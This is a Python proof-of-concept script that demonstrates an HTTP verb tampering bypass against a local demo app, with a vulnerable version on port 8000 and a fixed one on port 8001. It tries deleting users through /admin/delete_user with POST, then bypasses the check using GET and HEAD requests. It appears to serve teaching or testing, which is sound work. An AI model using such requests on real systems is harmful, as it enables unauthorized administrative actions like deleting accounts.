# Reproduces the HTTP verb tampering bypass (standard library only).
# Usage: python3 attack.py          -> vulnerable app (port 8000)
#        python3 attack.py 8001     -> fixed app (port 8001)
import sys
import urllib.error
import urllib.parse
import urllib.request

port = sys.argv[1] if len(sys.argv) > 1 else "8000"
BASE = f"http://127.0.0.1:{port}"


def send(method, path, data=None):
    body = urllib.parse.urlencode(data).encode() if data else None
    req = urllib.request.Request(BASE + path, data=body, method=method)
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read().decode().strip()
    except urllib.error.HTTPError as e:
        return e.code, ""


def show(title, method, path, data=None):
    status, text = send(method, path, data)
    print(f"[{status}] {title:<36} {method} {path}")
    if text:
        print(f"       -> {text}")


print(f"== target: {BASE} ==")
show("list users", "GET", "/users")
show("1) POST as non-admin (expected path)", "POST", "/admin/delete_user", {"username": "alice"})
show("2) bypass with GET + query string", "GET", "/admin/delete_user?username=alice")
show("3) bypass with HEAD (empty body)", "HEAD", "/admin/delete_user?username=bob")
show("list users (check result)", "GET", "/users")
